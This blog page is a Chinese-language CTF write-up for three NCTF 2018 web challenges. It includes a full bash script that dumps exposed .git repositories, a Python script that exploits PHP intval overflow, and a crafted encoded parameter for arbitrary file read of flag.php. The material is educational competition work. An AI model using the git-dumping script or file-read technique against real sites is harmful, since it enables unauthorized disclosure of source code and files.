<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  

  
  <title>南邮CTF-2018 | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="全球最大交友网站进入网站是一个时钟。并没什么思路，只能拿工具扫一下了。.git禁止访问，可能存在git源码泄露。用lijiejie的工具，下载源码发现没啥乱用，一个readme.txt。本来没想点进去，发现确实有提示 Allsource files areingit tag1.0 这意思是所有的源码都在 tag1.0中，也就是不在这个版本中。也就是说这个版本他把仓库东西给删除了，你如果想要1.0版">
<meta name="keywords" content="CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="南邮CTF-2018">
<meta property="og:url" content="http://yoursite.com/2018/12/06/南邮CTF-2018/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="全球最大交友网站进入网站是一个时钟。并没什么思路，只能拿工具扫一下了。.git禁止访问，可能存在git源码泄露。用lijiejie的工具，下载源码发现没啥乱用，一个readme.txt。本来没想点进去，发现确实有提示 Allsource files areingit tag1.0 这意思是所有的源码都在 tag1.0中，也就是不在这个版本中。也就是说这个版本他把仓库东西给删除了，你如果想要1.0版">
<meta property="og:locale" content="en">
<meta property="og:image" content="https://i.imgur.com/0Pw6skq.png">
<meta property="og:image" content="https://i.imgur.com/DN5IB6S.png">
<meta property="og:image" content="https://i.imgur.com/xJhVeKY.png">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11900959-7ad0cc3749de9cf4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/457">
<meta property="og:image" content="https://i.imgur.com/ZI77p9c.png">
<meta property="og:image" content="https://i.imgur.com/rO6sIC8.png">
<meta property="og:image" content="https://i.imgur.com/BEAt4p8.png">
<meta property="og:image" content="https://i.imgur.com/wH9nOh1.png">
<meta property="og:image" content="https://i.imgur.com/L3m1MHA.png">
<meta property="og:updated_time" content="2018-12-07T13:57:46.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="南邮CTF-2018">
<meta name="twitter:description" content="全球最大交友网站进入网站是一个时钟。并没什么思路，只能拿工具扫一下了。.git禁止访问，可能存在git源码泄露。用lijiejie的工具，下载源码发现没啥乱用，一个readme.txt。本来没想点进去，发现确实有提示 Allsource files areingit tag1.0 这意思是所有的源码都在 tag1.0中，也就是不在这个版本中。也就是说这个版本他把仓库东西给删除了，你如果想要1.0版">
<meta name="twitter:image" content="https://i.imgur.com/0Pw6skq.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-南邮CTF-2018" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/12/06/南邮CTF-2018/" class="article-date">
  <time datetime="2018-12-05T16:00:00.000Z" itemprop="datePublished">2018-12-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      南邮CTF-2018
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="全球最大交友网站"><a href="#全球最大交友网站" class="headerlink" title="全球最大交友网站"></a>全球最大交友网站</h1><p>进入网站是一个时钟。<br><img src="https://i.imgur.com/0Pw6skq.png" alt><br>并没什么思路，只能拿工具扫一下了。.git禁止访问，可能存在git源码泄露。用lijiejie的工具，下载源码发现没啥乱用，一个readme.txt。本来没想点进去，发现确实有提示</p>
<p>Allsource files areingit tag1.0</p>
<p>这意思是所有的源码都在 tag1.0中，也就是不在这个版本中。也就是说这个版本他把仓库东西给删除了，你如果想要1.0版本必须要回溯到1.0版本。不过既然有.git按道理说都是可以看到的。一个工具给大家。</p>
<pre><code>#!/bin/bash
#
# Author: Denny Huang &lt;denny0223@gmail.com&gt;
# Wed Sep 17 2014
# MIT License
function downloadBlob {
    echo downloadBlob $1
    mkdir -p ${1:0:2}
    cd $_

    wget -q -nc $domain/.git/objects/${1:0:2}/${1:2}

    cd ..
}

function parseTree {
    echo parseTree $1

    downloadBlob $1

    while read line
    do
        type=$(echo $line | awk &apos;{print $2}&apos;)
        hash=$(echo $line | awk &apos;{print $3}&apos;)

        [ &quot;$type&quot; = &quot;tree&quot; ] &amp;&amp; parseTree $hash || downloadBlob $hash
    done &lt; &lt;(git cat-file -p $1)
}

function parseCommit {
    echo parseCommit $1

    downloadBlob $1

    tree=$(git cat-file -p $1| sed -n &apos;1p&apos; | awk &apos;{print $2}&apos;)
    parseTree $tree

    parent=$(git cat-file -p $1 | sed -n &apos;2p&apos; | awk &apos;{print $2}&apos;)

    [ ${#parent} -eq 40 ] &amp;&amp; parseCommit $parent
}

[ -z $1 ] &amp;&amp; echo -e &quot;missing target url\n\n\
Usage: scrabble &lt;url&gt;\n\
Example: scrabble http://example.com/\n\n\
You need make sure target url had .git folder&quot;\
&amp;&amp; exit

domain=$1
ref=$(curl -s $domain/.git/HEAD | awk &apos;{print $2}&apos;)

lastHash=$(curl -s $domain/.git/$ref)

git init

cd .git/objects/

parseCommit $lastHash

cd ../../

echo $lastHash &gt; .git/refs/heads/master

git reset --hard</code></pre><p>用法如图<br>注意 scrabble 是我上面脚本的名字。无需后缀，要在linux bash运行<br><img src="https://i.imgur.com/DN5IB6S.png" alt></p>
<p>之后便可以当作自己的git仓库来使用。如 git log</p>
<p><img src="https://i.imgur.com/xJhVeKY.png" alt></p>
<p>上面是我本地测试自己的代码。我们回归正题。因为题目已经关了，没法复现题目中的git,意思就是git log，查看到各个版本的版本号，然后 </p>
<p>git show HEAD 版本号查看进行了什么修改增加便可以看到flag。</p>
<p>root@xiaozhupeiqi:/scrabble# git show HEAD cf36b7a28707d581e4c5be4a2061ad41c9d386e2</p>
<p><img src="https://upload-images.jianshu.io/upload_images/11900959-7ad0cc3749de9cf4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/457" alt></p>
<h1 id="小绿草之最强大脑"><a href="#小绿草之最强大脑" class="headerlink" title="小绿草之最强大脑"></a>小绿草之最强大脑</h1><p><img src="https://i.imgur.com/ZI77p9c.png" alt></p>
<p>前言：比赛结束后测试的，自我认为是环境问题，使用别人的poc也跑不出来flag，就当自己练习脚本了。</p>
<p>先贴出脚本自写（未验证准确性）</p>
<pre><code>import requests
import re
import time
url=&apos;http://127.0.0.1/2/index.php&apos;
s=requests.Session()
r=s.get(url)
while(1):
    a = r.content[1600:4250].decode(encoding=&apos;utf-8&apos;)
    matchp = re.findall(r&apos;[0-9\+\-\*]&apos;,a)
    a=&quot;&quot;
    for i in matchp:
        a=a+i
    b=&quot;&quot;
    map=re.findall(r&apos;[1-9]+[0]*[1-9]+[0]*[1-9]+[0]*[1-9]+[\+\-\*]*&apos;,a)
    for i in map:
        b=b+i
    b=&apos;9223372036854775807+&apos;+b
    print b
    print eval(b)

    c=eval(b)

    payload={&apos;input&apos;:&apos;1111111111111111111111&apos;,&apos;ans&apos;:c}
    r=s.post(url,data=payload)
    time.sleep(1.5)
    print r.content.decode(encoding=&apos;utf-8&apos;)</code></pre><p>分析：<br>此题中一看场面应该是自写脚本然后计算结果快速提交。但是肯定会有考其他的知识点。以后看到ctf先扫一波，扫到源码</p>
<p>源码中有一很重要的知识点<br>知识点 1</p>
<pre><code>if(($_SESSION[&apos;ans&apos;])+intval($_POST[&apos;input&apos;])!=$_POST[&apos;ans&apos;]){</code></pre><p>intval 是防止程序溢出的函数，32位系统溢出最大：2147483647 64位系统溢出最大：9223372036854775807，检测为64位系统，所以你提交22位的数字会自动转化为 9223372036854775807，所以脚本计算的时候要使用 9223372036854775807 而不是22位自己input的数字。</p>
<p>知识点2 </p>
<pre><code>if(intval(time())-$_SESSION[&apos;time&apos;]&lt;1){
            session_destroy();
            echo &apos;
            &lt;script language=&quot;javascript&quot;&gt;  
            alert(&quot;你手速太快啦，服务器承受不住!!!&quot;);  
            window.history.back(-1); &lt;/script&gt; &apos;;
        }</code></pre><p>源码中指定不能提交速度太快，在github上下载的所有源码规定的是如果你提交五次正确答案就给你flag，但是你不能提交太快，我们使用函数<br>time.sleep(1.5)，定义1.5S 提交一次。</p>
<p>知识点3 </p>
<p>正则，我是没写过几次正则的，所以写的很辣鸡，是真的辣鸡，匹配有点鸡肋，说不清自己体会把。。</p>
<p>知识点4</p>
<p>必须要做一个session，因为需要一个用户提交五次及以上。</p>
<p>知识点5</p>
<p>findall函数要学清楚，细心！就完事。</p>
<p>脚本运行截图</p>
<p><img src="https://i.imgur.com/rO6sIC8.png" alt><br>不要问我为什么没算对，应该是直接下载源码环境不对，算是肯定算对了的，网上下载的poc也同样没跑出来flag，应该是环境嗯，环境问题。</p>
<h1 id="Go-Lakers"><a href="#Go-Lakers" class="headerlink" title="Go Lakers"></a>Go Lakers</h1><p>进去之后发现网站跳转302，抓包，看到最下面，（我发现CTF不细心的人做不出来还会原地爆炸）<br><img src="https://i.imgur.com/BEAt4p8.png" alt></p>
<!-- post me viewsource -->
<p>post 一个 viewsource参数就好看到源码</p>
<p><img src="https://i.imgur.com/wH9nOh1.png" alt></p>
<pre><code>if(!(getip() === &apos;127.0.0.1&apos; &amp;&amp; file_get_contents($_GET[&apos;9527&apos;]) === &apos;nctf_is_good&apos; &amp;&amp; mt_rand(1,10000) === intval($_GET[&apos;go_Lakers&apos;]))){
    header(&apos;location:https://bbs.hupu.com/24483652.html?share_from=kqapp&apos;);
}else{
    echo &apos;great&apos;;
}</code></pre><p>这玩意是**骗人的，不用绕我日！<br>自己体会。利用最后一句源码 就是读取文件就完事</p>
<pre><code>echo file_get_contents(de_code($_GET[&apos;file_&apos;]));</code></pre><p>将function逆向编写，然后顺理成章的下面就会读取文件。flag.php就在当前文件下，直接读就行了</p>
<p>逆向代码</p>
<pre><code>for($i=0;$i&lt;strlen($value);$i++){
        $result .= chr(ord($value[$i])+$i*2);
    }
    $result=base64_encode($result);
    echo $result;</code></pre><p>value输入想读的文件输入flag.php 转换成Zm5lbTZ6dH4=<br>然后提交file_=Zm5lbTZ6dH4=就可读取flag.php<br>千万不要被骗了，哭了！<br><img src="https://i.imgur.com/L3m1MHA.png" alt></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/12/06/南邮CTF-2018/" data-id="ck0l0oh9t001opy2ip9hh2iwj" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2018/12/14/flask从0到无/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          Flask从零到无
        
      </div>
    </a>
  
  
    <a href="/2018/12/04/git工具的使用/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">git使用与部署github</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web漏洞/">web漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂/">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/web漏洞/" style="font-size: 18px;">web漏洞</a> <a href="/tags/杂/" style="font-size: 16px;">杂</a> <a href="/tags/渗透攻防/" style="font-size: 12px;">渗透攻防</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2019/06/25/csp内容安全策略/">csp内容安全策略</a>
          </li>
        
          <li>
            <a href="/2019/05/25/thinkphp3.2.3/">thinkphp框架学习</a>
          </li>
        
          <li>
            <a href="/2019/05/17/url跳转实战/">渗透之url跳转</a>
          </li>
        
          <li>
            <a href="/2019/04/20/反序列化学习/">PHP反序列化学习</a>
          </li>
        
          <li>
            <a href="/2019/04/14/2019DDCTF/">2019DDCTF</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>